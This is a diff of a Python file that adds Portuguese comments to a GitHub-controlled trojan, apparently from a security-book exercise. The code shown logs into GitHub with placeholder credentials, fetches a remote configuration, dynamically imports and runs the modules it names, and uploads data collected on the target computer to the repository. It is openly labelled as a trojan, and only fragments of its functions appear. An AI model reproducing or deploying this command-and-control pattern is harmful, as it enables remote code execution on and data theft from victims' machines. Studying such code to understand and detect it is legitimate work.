@@ -9,6 +9,7 @@ trojan_modules = []
 configured = False
 task_queue = Queue.Queue
 
+# Realiza a autenticacao do repositorio Git e obtem objetos "repo" e "branch"
 def connect_to_github():
     gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
     repo = gh.repository('testing-gt', 'cap7')
@@ -16,6 +17,8 @@ def connect_to_github():
 
     return gh, repo, branch
 
+
+# Obtem os arquivos do repositorio e os executam localcamente
 def get_file_content(filepath):
     gh, repo, branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
@@ -29,6 +32,9 @@ def get_file_content(filepath):
 
         return None
 
+
+# Obtem o documento de configuracao remoto do repositorio
+# para saber quais modulos deve ser executado
 def get_trojan_config():
     global configured
     #global trojan_config
@@ -42,6 +48,8 @@ def get_trojan_config():
             exec('import %s' % task['module'])
     return config
 
+
+# Envia quaisquer dados coletados no computador-alvo
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
     remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000,100000))
